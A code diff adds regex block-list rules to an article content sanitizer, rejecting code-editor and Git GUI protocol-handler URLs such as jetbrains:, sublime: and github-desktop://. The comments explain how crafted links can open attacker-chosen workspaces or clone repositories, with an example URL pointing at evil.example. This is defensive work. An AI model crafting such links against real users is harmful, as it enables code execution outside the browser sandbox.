@@ -762,6 +762,27 @@ const unsafeContentPatterns = [
   // sandbox with no script. Same native protocol-handler class as the blocked
   // ms-*/onenote: handlers; the editor scheme names never occur in glossary prose.
   { pattern: /\b(?:vscode-insiders|vscodium|vscode)\s*:/i, reason: 'code-editor protocol-handler URLs are not allowed in article content' },
+  // jetbrains:/intellij:/pycharm:/webstorm:/phpstorm:/sublime:/atom: are the remaining
+  // JetBrains-family / Sublime / Atom code-editor protocol handlers the OS resolves to
+  // launch the locally-installed editor — not the browser — when a link is clicked. A
+  // crafted jetbrains://…/open?file=…, sublime://open?url=… or atom://… link can open
+  // an attacker-chosen folder / file / workspace (whose tasks or trusted-workspace
+  // settings then run through the editor's own build/launch tooling — Gradle, npm,
+  // Make, or arbitrary Run Configurations) or drive editor commands, all outside the
+  // page sandbox with no script. github-mac:/github-windows:/github-desktop:/sourcetree:/
+  // gitkraken:/tower:/fork: are the matching native Git / GitHub GUI clients: a clicked
+  // github-desktop://openRepo?url=https://evil.example/.git or
+  // sourcetree://…/cloneRepo?… drives the registered desktop client to clone an
+  // attacker-chosen repository outside the page sandbox, with no script. All 14 scheme
+  // names never occur as live URLs in glossary prose; the editor schemes use the
+  // (?=non-space) lookahead (the same structural-marker form as the existing obsidian:/
+  // onenote:/wc: blocks) so prose like "JetBrains IDEs" or "Sublime Text" or "Atom: a
+  // code editor" (a scheme name followed by a space) is never affected. Same native
+  // protocol-handler class as the blocked vscode:/vscodium:/git:/svn:/cvs:/onenote:/
+  // ms-* handlers above; the // authority form on the github-/sourcetree/gitkraken/
+  // tower/fork handlers keeps prose like "a Git Tower client" safe.
+  { pattern: /\b(?:jetbrains|intellij|pycharm|webstorm|phpstorm|sublime|atom)\s*:(?=[^\s"'<>)])/i, reason: 'code-editor protocol-handler URLs are not allowed in article content' },
+  { pattern: /\b(?:github-mac|github-windows|github-desktop|sourcetree|gitkraken|tower|fork)\s*:\/\//i, reason: 'source-control GUI protocol-handler URLs are not allowed in article content' },
   // chrome:// edge:// opera:// vivaldi:// brave:// devtools:// chrome-untrusted:// are
   // browser-INTERNAL page URL schemes that address privileged browser UI (chrome://settings,
   // edge://flags, devtools://) rather than an http(s) resource. Article links are limited to
@@ -1106,6 +1127,8 @@ const obfuscatedSchemePatterns = [
   { pattern: /(?:mhtml|jar)\s*:/i, reason: 'archive-extraction URL schemes are not allowed in article content' },
   { pattern: /(?:magnet|ed2k)\s*:/i, reason: 'peer-to-peer file-sharing URL schemes are not allowed in article content' },
   { pattern: /(?:vscode-insiders|vscodium|vscode)\s*:/i, reason: 'code-editor protocol-handler URLs are not allowed in article content' },
+  { pattern: /(?:jetbrains|intellij|pycharm|webstorm|phpstorm|sublime|atom)\s*:(?=[^\s"'<>)])/i, reason: 'code-editor protocol-handler URLs are not allowed in article content' },
+  { pattern: /(?:github-mac|github-windows|github-desktop|sourcetree|gitkraken|tower|fork)\s*:\/\//i, reason: 'source-control GUI protocol-handler URLs are not allowed in article content' },
   { pattern: /(?:chrome-untrusted|chrome|edge|opera|vivaldi|brave|devtools)\s*:\/\//i, reason: 'browser-internal page URL schemes are not allowed in article content' },
   { pattern: /(?:redis|rediss|mongodb(?:\+srv)?|mysql|mariadb|sqlite|influxdb|postgresql|postgres|memcached|etcd|consul|snowflake|sqlserver|mssql|timescaledb)\s*:\/\//i, reason: 'database-connection URL schemes are not allowed in article content' },
   { pattern: /(?:git|svn|cvs)\s*:\/\//i, reason: 'version-control protocol URL schemes are not allowed in article content' },
@@ -1174,6 +1197,8 @@ const infoboxRowValueSchemePatterns = [
   /(?:mhtml|jar)\s*:/i,
   /(?:magnet|ed2k)\s*:/i,
   /(?:vscode-insiders|vscodium|vscode)\s*:/i,
+  /\b(?:jetbrains|intellij|pycharm|webstorm|phpstorm|sublime|atom)\s*:(?=[^\s"'<>)])/i,
+  /\b(?:github-mac|github-windows|github-desktop|sourcetree|gitkraken|tower|fork)\s*:\/\//i,
   /(?:chrome-untrusted|chrome|edge|opera|vivaldi|brave|devtools)\s*:\/\//i,
   /(?:redis|rediss|mongodb(?:\+srv)?|mysql|mariadb|sqlite|influxdb|postgresql|postgres|memcached|etcd|consul|snowflake|sqlserver|mssql|timescaledb)\s*:\/\//i,
   /(?:git|svn|cvs)\s*:\/\//i,
